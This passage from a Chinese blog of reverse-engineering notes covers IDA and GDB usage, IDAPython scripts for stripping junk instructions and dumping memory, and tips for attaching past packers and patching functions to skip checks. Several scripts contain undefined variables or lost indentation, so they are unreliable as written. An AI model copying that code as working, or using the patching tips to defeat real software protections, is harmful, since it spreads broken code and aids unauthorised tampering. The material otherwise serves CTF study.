在汇编界面中搜索汇编语言</li><li><code>Shift + E</code></li></ol><h3 id="更改"><a class="markdownIt-Anchor" href="#更改"></a> 更改</h3><ol><li><p><code>D</code> (DATA) 转换为原始数据</p><p><code>C</code> (CODE) 转换为汇编代码</p><p><code>P</code> 重新生成函数</p><p><code>a</code> 将数据转换为字符串，主要可以应对小端序存储</p></li><li><p><code>N</code> 更改变量的名称</p><p><code>Y</code> 更改变量的类型，比如把_int64 更正为BYTE*(或者char *)</p><p><code>U</code> undefine，取消定义函数、代码、数据的定义，转化为原始字节的形式</p><p><code>V</code> 简化函数的格式，有时候函数没有return时可以使用，查看更方便</p><p><code>M</code> 枚举所有相同的数据</p></li><li><p><code>;</code> 在反汇编后的界面中写下注释</p><p><code>/</code> 在反编译后伪代码的界面中写下注释</p></li><li><p><code>\</code> 在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述</p><ul><li>有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</li><li>右键点击Hide casts----也可以隐藏类似*(DWORD)的类型描述</li></ul></li></ol><h2 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h2><h3 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h3><ol><li><code>F2</code> 增加断点</li><li><code>F7</code> 单步步入，遇到函数，将进入函数代码内部</li><li><code>F8</code> 单步步过，执行下一条指令，不进入函数代码内部</li><li><code>F4</code> 运行到光标处(断点处)</li><li><code>F9</code> 继续运行</li><li><code>Ctrl+F2</code> 终止一个正在运行的调试进程</li><li><code>Ctrl+F7</code> 运行至返回,直到遇到RETN(或断点)时才停止</li></ol><h3 id="附加"><a class="markdownIt-Anchor" href="#附加"></a> 附加</h3><ul><li>应对一些强壳，可以先启动 <code>.exe</code> 程序，之后使用IDA的附加功能<code>(Debugger-&gt;attach)</code>，附加进程，可以越过壳。</li><li>之后可以使用<code>Shift + f12</code> 和 <code>Shift + f7</code> 定位关键字符位置和段属性，将该程序的 Code 段使用 IDAPYTHON 转化为反汇编形式进行动调。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ida_ua <span class="hljs-keyword">import</span> *<br>cur_addr = <span class="hljs-number">0x401000</span> <span class="hljs-comment">#起始地址</span><br>end_addr = <span class="hljs-number">0x410000</span>   <span class="hljs-comment">#终止地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_insn</span>(<span class="hljs-params">start,end</span>):<br>adr = start<br>out_ins = insn_t()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-keyword">if</span>(adr &gt;= end): <br><span class="hljs-keyword">break</span><br>create_insn(adr)<br>size = decode_insn(out_ins,adr)<br>adr += size<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;end!&quot;</span>)<br>make_insn(cur_addr,end_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done&quot;</span>)<br></code></pre></td></tr></table></figure><blockquote><p>可能 Code 段很大，编译很慢，可以结合手动按c反汇编结合查看</p></blockquote><h3 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h3><h4 id="ida动态调试elf"><a class="markdownIt-Anchor" href="#ida动态调试elf"></a> IDA动态调试ELF</h4><p><a href="https://blog.csdn.net/weixin_44959377/article/details/105866347">Kali虚拟机开启远程服务</a></p><p><a href="https://www.cnblogs.com/DorinXL/p/12732721.html">IDA调试ELF文件</a></p><p><a href="https://blog.csdn.net/abc_670/article/details/80066817">ida动态调试elf</a></p><p><a href="https://www.cnblogs.com/longyuan-z/p/7787860.html">使用GDB调试时attach ID不被允许 - longyuan-z - 博客园 (cnblogs.com)</a></p><ul><li>Linux开启远程连接服务，在虚拟机中打开IDA在Linux中的调试工具</li><li>首先需要将文件提权，否则不能运行，也就不能调试了</li><li>IDA连接虚拟机，开始动调</li><li>Linux进行附加时，需要先打开linux_server服务，然后另起端口打开运行的程序，之后就可以附加了。这里需要先使用 <code>sudo vim /etc/sysctl.d/10-ptrace.conf</code> 更改最后一行 <code>kernel.yama.ptrace_scope = 0</code>，重启系统后，普通用户就可以使用attach ID连接程序调试了。</li><li>注意wsl的 <code>Hosrname</code> 可以设置为 <code>127.0.0.1</code>，有时候设置成wsl的ip不太起效果</li><li>为了方便 IDA 中的 application，可以使用 <code>realpath 。/file</code> 直接获取文件的路径</li></ul><h2 id="idapython-2"><a class="markdownIt-Anchor" href="#idapython-2"></a> IDAPYTHON</h2><p><a href="https://www.hex-rays.com/products/ida/support/idapython_docs/">IDAPYTHON文档</a></p><p><a href="https://www.cnblogs.com/biyifei/p/17153109.html#:~:text=idc.get_reg_value">IDApython - 比翼飞</a></p><h3 id="导入模块"><a class="markdownIt-Anchor" href="#导入模块"></a> 导入模块</h3><ul><li><p><code>import ida_bytes</code>和<code>import idc_bc695</code>的效果一样，都是让idapython的脚本可以执行7.0之前的简单样式，但是要区分二者的不同：</p><ul><li><p>对于patch_byte，ida_bytes中是patch_byte，而idc_bc695中是PatchByte----注意区分</p></li><li><blockquote><p>不知道是否是导入了idc_bc695的py与pyc文件，现在的IDA7.7<strong>新旧函数</strong>都可以使用----<strong>不一定</strong></p></blockquote></li></ul></li></ul><h3 id="函数解释"><a class="markdownIt-Anchor" href="#函数解释"></a> 函数解释</h3><ul><li><p><code>Patch</code>：</p><ul><li><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>PatchByte(addr,value)</td><td>将value赋值到addr上，字节形式修改</td></tr><tr><td>PatchWord(addr,value)</td><td>将value赋值到addr上，双字形式修改</td></tr><tr><td>PatchDword(addr,value)</td><td>将value赋值到addr上，四字形式修改</td></tr><tr><td>PatchQword(addr,value)</td><td>将value赋值到addr上，八字形式修改</td></tr></tbody></table></li></ul></li><li><p><code>Byte</code>：</p><ul><li><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><strong>Byte(addr)</strong></td><td>以字节为单位获取地址处的值</td></tr><tr><td><strong>Word(addr)</strong></td><td>同上. 以2字节(字)的单位获取</td></tr><tr><td><strong>Dword(addr)</strong></td><td>4字节</td></tr><tr><td><strong>Qword(addr)</strong></td><td>8字节</td></tr></tbody></table></li></ul></li></ul><h3 id="花指令"><a class="markdownIt-Anchor" href="#花指令"></a> 花指令</h3><h4 id="模板一"><a class="markdownIt-Anchor" href="#模板一"></a> 模板一</h4><ul><li><code>jnz--jz</code> 跳转后加入<code>E8</code>问题</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idautils<br><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_nop</span>(<span class="hljs-params">addr,endaddr</span>):<br>    <span class="hljs-keyword">while</span> addr &lt; endaddr:<br>        patch_byte(addr,<span class="hljs-number">0x90</span>)<br>        addr += <span class="hljs-number">1</span><br>pattern = <span class="hljs-string">&quot;33 C0 85 C0 74 03 75 00 E8&quot;</span><br>cur_addr = <span class="hljs-number">0x401000</span> <span class="hljs-comment">#开始地址</span><br>end_addr = <span class="hljs-number">0x405000</span> <span class="hljs-comment">#结束地址</span><br><span class="hljs-keyword">while</span> cur_addr &lt;= end_addr:<br>    cur_addr = idc.find_binary(cur_addr,SEARCH_DOWN,pattern)<span class="hljs-comment"># find_binary() 函数搜索 pattern，其中SEARCH_DOWN表示从cur_addr向高地址方向搜索</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;patch address: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(cur_addr))) <span class="hljs-comment"># 打印信息</span><br>    <span class="hljs-keyword">if</span> cur_addr == idc.BADADDR:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        my_nop(cur_addr,cur_addr + <span class="hljs-number">9</span>)<br>    cur_addr = idc.next_head(cur_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="模板二"><a class="markdownIt-Anchor" href="#模板二"></a> 模板二</h4><ul><li>去除 <code>jmp</code> 花指令</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#idapy去除花指令，特征值查看按键为D</span><br><span class="hljs-keyword">import</span> idc_bc695 <span class="hljs-keyword">as</span> idc<br>cur_addr = <span class="hljs-number">0x80487C4</span> <span class="hljs-comment">#开始地址</span><br>enc_addr = <span class="hljs-number">0x80488DF</span> <span class="hljs-comment">#结束地址</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cur_addr,end_addr):<br>    <span class="hljs-keyword">if</span> idc.Dword(i) == <span class="hljs-number">0x05ebb866</span>:<span class="hljs-comment">#请修改此处特征值</span><br>        <span class="hljs-keyword">if</span> idc.Dword(i+<span class="hljs-number">4</span>) == <span class="hljs-number">0xfa74c031</span>:<span class="hljs-comment">#请修改此处花指令特征值</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>                idc.PatchByte(i+j,<span class="hljs-number">0x90</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="操作-2"><a class="markdownIt-Anchor" href="#操作-2"></a> 操作</h3><h4 id="dump内存"><a class="markdownIt-Anchor" href="#dump内存"></a> dump内存</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idc_bc695 <span class="hljs-keyword">as</span> idc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    cur_addr = <span class="hljs-number">0x140003040</span>; <span class="hljs-comment"># 起始地址</span><br>    size = <span class="hljs-number">0x34166</span>  <span class="hljs-comment"># 大小</span><br>    <span class="hljs-built_in">list</span> = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):<br>        byte_tmp = idc.Byte(begin + i)<br>        <span class="hljs-built_in">list</span>.append(byte_tmp)<br>        <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span>) % <span class="hljs-number">0x1000</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All count:&#123;&#125;, collect current:&#123;&#125;, has finish&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(size), <span class="hljs-built_in">hex</span>(i + <span class="hljs-number">1</span>), <span class="hljs-built_in">float</span>(i + <span class="hljs-number">1</span>) / size))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;collect over&#x27;</span>)<br>    file = <span class="hljs-string">&quot;LOADER2.exe&quot;</span>  <span class="hljs-comment">#输出文件地址+名</span><br>    buf = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">list</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> fw:<br>        fw.write(buf)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;write over&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="取数值"><a class="markdownIt-Anchor" href="#取数值"></a> 取数值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> idc_bc695 <span class="hljs-keyword">import</span> *<br>cur_addr = <span class="hljs-number">0x6020c0</span>  <span class="hljs-comment">#起始地址</span><br>end_addr = <span class="hljs-number">0x60213c</span>  <span class="hljs-comment">#终止地址</span><br><span class="hljs-built_in">len</span> = end_addr - cur_addr<br>arr1 = []<br>arr2 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>):<br>    arr1.append(Byte(cur_addr + i)) <span class="hljs-comment">#单个字节获取</span><br>    arr2.append(Dword(cur_addr + <span class="hljs-number">4</span> * i))<span class="hljs-comment">#四个字节获取</span><br><span class="hljs-built_in">print</span>(arr1)<br><span class="hljs-built_in">print</span>(arr2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="插件及其使用"><a class="markdownIt-Anchor" href="#插件及其使用"></a> 插件及其使用</h2><h3 id="配置python及插件"><a class="markdownIt-Anchor" href="#配置python及插件"></a> 配置python及插件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">.\idapyswitch.exe --force-path your path of python3.dll# 使用idapyswitch切换为自己的python程序<br><span class="hljs-meta prompt_"># </span><span class="language-bash">之后配置插件</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">配置findcrypto3插件，下载yara</span><br>python.exe -m pip install yara-python<br><span class="hljs-meta prompt_"># </span><span class="language-bash">配置patching插件</span><br>python.exe -m pip install keystone-engine<br></code></pre></td></tr></table></figure><h3 id="bindiff"><a class="markdownIt-Anchor" href="#bindiff"></a> bindiff</h3><ul><li>可以看出二进制文件中的差异，样例:GUDOCTF–L!S!</li></ul><h3 id="go_parser"><a class="markdownIt-Anchor" href="#go_parser"></a> go_parser</h3><ul><li>直接在 file/Script file里面运行<code>go_parser.py</code>即可解析</li></ul><h3 id="d-810"><a class="markdownIt-Anchor" href="#d-810"></a> D-810</h3><ul><li><p>将 <code>d810</code> 文件夹与 <code>D810.py</code> 文件一同放在 <code>plugins</code> 目录下</p></li><li><p>选择适当的规则，然后点击 <code>start</code>，之后就可以按 F5 自动反编译，解决OLLVM混淆。如果已经存在 F5缓存，可以将一段代码nop掉，之后撤销操作，再 F5 反编译即可</p></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401152139298.png" alt="image-20240115213925148" /></p><h1 id="gdb"><a class="markdownIt-Anchor" href="#gdb"></a> GDB</h1><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html">gdb调试利器</a></p><p><a href="https://www.cnblogs.com/murkuo/p/15965270.html">pwngdb操作</a></p><blockquote><p>gdb的配置在于 ~/.gdbinit</p><p>设置 base = 0x4000000 可以固定每次分析的基址，之后的断点可以使用 base + 偏移来进行</p></blockquote><h2 id="相关操作"><a class="markdownIt-Anchor" href="#相关操作"></a> 相关操作</h2><h3 id="运行"><a class="markdownIt-Anchor" href="#运行"></a> 运行</h3><ul><li><code>run</code>：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。</li><li><code>continue</code>：简写c，继续执行，到下一个断点处(或运行结束)</li><li><code>stepi &lt;n&gt;</code>：简写 <code>si &lt;n&gt;</code>，单步调试(n为多次执行)如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的</li><li><code>nexti &lt;n&gt;</code>：简写 <code>ni &lt;n&gt;</code>，单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。</li><li><code>display</code>：简写 <code>disp</code>，这个可以设置每次gdb显示的调试信息，如 <code>display /4i $rip</code> 会让每次调试都显示出rip出来(i-&gt;instruction)</li><li><code>until</code>：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。</li><li>until+行号： 运行至某行，不仅仅用来跳出循环</li><li><code>finish</code>：运行程序，<strong>直到当前函数完成返回</strong>，并打印函数返回时的堆栈地址和返回值及参数值等信息。</li><li>quit：简记为 q ，退出gdb</li></ul><h3 id="设置断点"><a class="markdownIt-Anchor" href="#设置断点"></a> 设置断点</h3><ul><li><p><code>break n</code> :简写b n，在第n行处设置断点，例如：b *0x80345C</p><p>(可以带上代码路径和代码名称： b OAGUPDATE.cpp:578)</p></li><li><p>b fn1 if a＞b：条件断点设置</p></li><li><p><code>break *func</code>：在函数func()的入口处设置断点，如：break *cb_button</p></li><li><p>delete(del) 断点号n：删除第n个断点</p></li><li><p>disable 断点号n：暂停第n个断点</p></li><li><p>enable 断点号n：开启第n个断点</p></li><li><p><code>info b</code>(info breakpoints)：显示当前程序的断点设置情况</p></li><li><p>delete breakpoints：清除所有断点</p></li></ul><h3 id="查看源代码"><a class="markdownIt-Anchor" href="#查看源代码"></a> 查看源代码</h3><ul><li><code>list</code> ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。</li><li>list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12</li><li>list 函数名：将显示“函数名”所在函数的源代码，如：list main</li></ul><h3 id="查看内存数据"><a class="markdownIt-Anchor" href="#查看内存数据"></a> 查看内存数据</h3><ul><li><p>格式：<code>x /nfu</code>----例如：<strong>x/s 0x80457F</strong>显示字符串</p></li><li><p>说明：</p><ul><li><p><code>x</code>：examine的缩写，检查</p></li><li><p><code>n</code>：表示要显示的内存单元的个数，比如：20</p></li><li><p><code>f</code>：表示显示方式</p><ul><li><table><thead><tr><th>显示方式</th><th>含义</th></tr></thead><tbody><tr><td>x</td><td>按十六进制格式显示变量</td></tr><tr><td>d</td><td>按十进制格式显示变量</td></tr><tr><td>u</td><td>按十进制格式显示无符号整型</td></tr><tr><td>o</td><td>按八进制格式显示变量</td></tr><tr><td>t</td><td>按二进制格式显示变量</td></tr><tr><td>a</td><td>按十六进制格式显示变量(显示指针)</td></tr><tr><td>i</td><td>指令地址格式</td></tr><tr><td>c</td><td>按字符格式显示变量</td></tr><tr><td>f</td><td>按浮点数格式显示变量</td></tr></tbody></table></li></ul></li><li><p><code>u</code>：表示一个地址单元长度</p><ul><li><table><thead><tr><th>显示方式</th><th>含义</th></tr></thead><tbody><tr><td>b</td><td>表示单字节</td></tr><tr><td>h</td><td>表示双字节</td></tr><tr><td>w</td><td>表示四字节</td></tr><tr><td>g</td><td>表示八字节</td></tr></tbody></table></li></ul></li></ul></li></ul><h3 id="打印表达式"><a class="markdownIt-Anchor" href="#打印表达式"></a> 打印表达式</h3><ul><li>print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。例如：<code>p $rsp</code>就打印rsp寄存器存储的内容</li><li>print ++a：将把 a 中的值加1,并显示出来</li><li>print name：将显示字符串 name 的值</li><li>print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数</li><li>display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a</li><li>info function：查询函数</li><li><code>info register/reg</code>：显示所有寄存器信息</li></ul><h3 id="查询运行信息"><a class="markdownIt-Anchor" href="#查询运行信息"></a> 查询运行信息</h3><ul><li><code>where/bt</code>：当前运行的堆栈列表；</li><li>bt backtrace 显示当前调用堆栈</li><li>up/down 改变堆栈显示的深度</li><li>set args 参数:指定运行时的参数</li><li>show args：查看设置好的参数</li><li>info program： 来查看程序的是否在运行，进程号，被暂停的原因。</li></ul><h3 id="分割窗口"><a class="markdownIt-Anchor" href="#分割窗口"></a> 分割窗口</h3><ul><li>layout：用于分割窗口，可以一边查看代码，一边测试：</li><li>layout src：显示源代码窗口</li><li>layout asm：显示反汇编窗口</li><li>layout regs：显示源代码/反汇编和CPU寄存器窗口</li><li>layout split：显示源代码和反汇编窗口</li><li>Ctrl + L：刷新窗口</li></ul><h3 id="其他设置"><a class="markdownIt-Anchor" href="#其他设置"></a> 其他设置</h3><ul><li><p>查看反汇编 <code>disassemble(disass) main</code></p></li><li><p>之后以intel汇编查看  <code>set disassembly-flavor intel</code>。这里可以执行 <code>echo 'set disassembly-flavor intel' &gt; ~/.gdbinit</code> 来设置gdb配置。因为 gdb 的配置全在 <code>~/.gdbinit</code> 中，所以设置这个是必要的</p></li><li><p>可以使用 <code>gdb -x a.gdb a.elf</code> 来使用gdb脚本调试程序</p></li></ul><blockquote><p>交互模式下直接回车的作用是重复上一指令，对于单步调试非常方便</p></blockquote><h2 id="脚本"><a class="markdownIt-Anchor" href="#脚本"></a> 脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">x.gdb脚本</span><br>b *main  # gdb脚本都是顺序执行的，要进行操作需要commands来配合<br>commands # 这里commands和断点是相连的，断到上面的断点就会执行commands-end中指令<br>silent  # 这里是不显示一些噪音，将断点设置等信息掩盖<br>p $rip<br>continue<br>end<br>run rebort  # 重启gdb<br>q<br></code></pre></td></tr></table></figure><p>​脚本执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb -x my_gdb_script.gdb ./a.out<br></code></pre></td></tr></table></figure><h2 id="操作指南"><a class="markdownIt-Anchor" href="#操作指南"></a> 操作指南</h2><p><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/">介绍 | 100个gdb小技巧 (gitbooks.io)</a></p><h1 id="经验"><a class="markdownIt-Anchor" href="#经验"></a> 经验</h1><h2 id="ida使用相关"><a class="markdownIt-Anchor" href="#ida使用相关"></a> IDA使用相关</h2><ol><li><p><code>Windows</code> 体系下注意小端序，使用 <code>Shift + e</code> 提取的字符串是转化过后的字符串，不需要再次转化。注意汇编模块读取可能会把地址也读进来，注意区分数据和地址。</p></li><li><p><code>Patch</code> 函数的时候，可以直接使用汇编。然后另存为文件即可跳过函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0x1<br>retn x #这里的x需要根据函数末尾的返回来抄写，防止栈不平衡<br></code></pre></td></tr></table></figure></li><li><p>遇到 <code>(_BYTE *)&amp;qword_4058</code> 之类的，若是知道这是表示的数组，那么可以再汇编界面按 <code>D</code> 变成数据，之后 <code>F5</code> 重新生成伪代码，则可以看到数组变成 <code>byte_4058[]</code> 之类的数组形式</p></li><li><p>若是函数格式中有 <code>(_BYTE)</code> 等干扰分析时，可以：</p><ol><li>使用 <code>Y</code> 更改变量的类型，比如把_int64 更正为BYTE*(或者char *)</li><li>使用 <code>V</code> 简化函数的格式，有时候函数没有 return 时可以使用，这样看更方便</li></ol></li><li><p>IDA在识别花指令时，很可能在一个连续的函数中显示红色的 <code>sub_3D9 endp ; sp-analysis failed</code> 类似的信息，这个时候可以使用 <code>Edit -&gt; Function -&gt; Delete function</code> 删除函数定义，然后在正确的位置 <code>retn</code> 使用 <code>Edit -&gt; Function -&gt; Set function end</code> 设置函数结尾。之后 <code>F5</code> 反编译可以看到正常的函数</p></li><li><p>有时候 <code>U</code> + <code>P</code> 不能生成函数，可以先删除函数定义，选中函数块之后按 <code>P</code> 定义函数</p></li></ol><h2 id="识别相关"><a class="markdownIt-Anchor" href="#识别相关"></a> 识别相关</h2><ol><li>代码最好两边夹击，从前往后看对输入的操作，从后往前看得到最终结果的操作</li><li>看 main 函数之前先看一下 <code>init</code> 段，这里会在main函数之前执行，可能隐藏了核心代码</li><li>若是函数的识别发现<code>变量异常</code>，可以点进去函数，然后在局部变量上按 <code>y</code> 之后返回主函数，就可以看到识别出变量的函数了</li></ol><h2 id="exp书写相关"><a class="markdownIt-Anchor" href="#exp书写相关"></a> exp书写相关</h2><ol><li><p>在python中 <code>&amp;0xff</code> 就是一个整数的后八位，在逆向中，常常有 <code>unsigned __int8</code> 作为数据类型，这个时候得出的结果就是取后八位作为结果，如果在python中使用，需要使用 <code>&amp; </code> 操作。同样，16位，32位的操作也是这样。</p></li><li><p>对于算法进行解密运算时，时刻注意小端序的问题，因为解密的过程中可能就需要将上一步的结果逆序放入下一步中 (TEA类型的解密最为拧巴，往往需要调换多次位置)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = <span class="hljs-number">0x67616c66</span><br>tmp1 = <span class="hljs-built_in">hex</span>(enc)[<span class="hljs-number">2</span>:]<br><span class="hljs-comment"># 将enc以两个字节为单位进行逆序排列</span><br>res1 = <span class="hljs-string">&#x27;0x&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(tmp),<span class="hljs-number">2</span>):<br>    res1 += tmp[<span class="hljs-built_in">len</span>(tmp) - i - <span class="hljs-number">2</span>: <span class="hljs-built_in">len</span>(tmp) - i]<br><span class="hljs-built_in">print</span>(res1)<br><br><span class="hljs-comment"># 将enc以两个字节为单位进行逆序排列并转化为字符</span><br>res2 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(tmp),<span class="hljs-number">2</span>):<br>    tmp2 = tmp[<span class="hljs-built_in">len</span>(tmp) - i - <span class="hljs-number">2</span>: <span class="hljs-built_in">len</span>(tmp) - i]<br>    res2 += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;0x&#x27;</span> + tmp2))<br><span class="hljs-built_in">print</span>(res2)<br></code></pre></td></tr></table></figure></li></ol><h2 id="数据处理"><a class="markdownIt-Anchor" href="#数据处理"></a> 数据处理</h2><ol><li>从IDA中获取数据时，如果在分析程序中发现数据的排列为 qword 等，建议不要以小端序转化，而是直接从IDA的 <code>IDA View-RIP</code> 界面复制，不用 <code>Ctrl + e</code> 提取数据。除此之外， qword 的转化可能会出现一些多余数据，记得识别。<ul><li>这里补充一点：若是在 <code>IDA View-RIP</code> 界面中的数据不是正规数据(这里指十六进制)，则采用 <code>Ctrl + e</code> 进行十六进制提取，再分别以4个字节为一组，然后倒转称为小端序的顺序进行解密操作。</li><li>总而言之<ol><li><p>可以首先使用 <code>Ctrl + e</code> 进行提取，然后手动进行倒转转换。</p></li><li><p>也可以使用 <code>D</code> 进行打乱，再分别使用 <code>D</code> 聚合成每4个字节为一组的形式</p></li><li><p>也可以使用插件 <code>lazyida</code>，在数据上 <code>右键</code> -&gt; <code>convert</code> -&gt; <code>Covern to …… DWORD list</code>(这里注意看前面的标识进行相依字节长度的转化) 就可以在下方output框看见正确的小端序数组。</p></li></ol></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUU刷题记录</title>
    <link href="/posts/87126416.html"/>
    <url>/posts/87126416.html</url>
    
